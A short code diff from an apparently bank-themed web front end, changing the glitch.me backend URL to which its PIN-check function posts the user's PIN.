@@ -36,7 +36,7 @@ const submit_pin = async (pin) => {
   document.querySelector("#pin").style.border = "2px solid #fff";
   try {
     const response = await fetch(
-      "https://zionintercontinentalb-backend.glitch.me/api/user/login/checkpin",
+      "https://zionintercontinentalbnk-biz-backend.glitch.me/api/user/login/checkpin",
       {
         method: "POST",
         headers: { "content-type": "application/json" },
